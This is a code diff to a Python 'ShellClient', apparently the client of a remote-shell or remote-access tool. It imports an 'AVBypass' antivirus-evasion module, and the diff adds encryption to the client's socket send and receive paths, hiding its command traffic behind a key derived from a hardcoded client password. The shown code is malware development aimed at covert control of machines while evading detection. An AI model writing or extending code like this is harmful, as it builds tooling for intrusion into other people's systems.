@@ -16,6 +16,23 @@ if _CLIENT_DIR not in sys.path:
     sys.path.insert(0, _CLIENT_DIR)
 
 try:
+    from .transport import (
+        MAX_FRAME_SIZE,
+        decrypt as _decrypt,
+        derive_key as _derive_key,
+        encode_message,
+        encrypt as _encrypt,
+    )
+except ImportError:
+    from transport import (
+        MAX_FRAME_SIZE,
+        decrypt as _decrypt,
+        derive_key as _derive_key,
+        encode_message,
+        encrypt as _encrypt,
+    )
+
+try:
     from av_bypass import AVBypass
 except ImportError:
     from client.av_bypass import AVBypass
@@ -802,14 +819,11 @@ class ShellClient:
         """Send data with length prefix (thread-safe)"""
         with self.send_lock:
             try:
-                if isinstance(data, str):
-                    data = data.encode('utf-8')
-
-                # Send length (4 bytes)
-                msg_len = len(data)
-                self.socket.sendall(struct.pack('!I', msg_len))
-                # Send data
-                self.socket.sendall(data)
+                length_packet, payload = encode_message(
+                    _encrypt(_derive_key(CLIENT_PASSWORD), data)
+                )
+                self.socket.sendall(length_packet)
+                self.socket.sendall(payload)
                 return True
 
             except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
@@ -835,12 +849,12 @@ class ShellClient:
 
                 msglen = struct.unpack('!I', raw_msglen)[0]
 
-                if msglen > 10 * 1024 * 1024:  # 10MB limit
+                if msglen > MAX_FRAME_SIZE:
                     print(f"[!] Message too large: {msglen} bytes")
                     return None
 
-                # Receive the actual message
-                return self._recv_exactly(msglen)
+                payload = self._recv_exactly(msglen)
+                return _decrypt(_derive_key(CLIENT_PASSWORD), payload)
 
             except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
                 print(f"[!] Connection error while receiving")
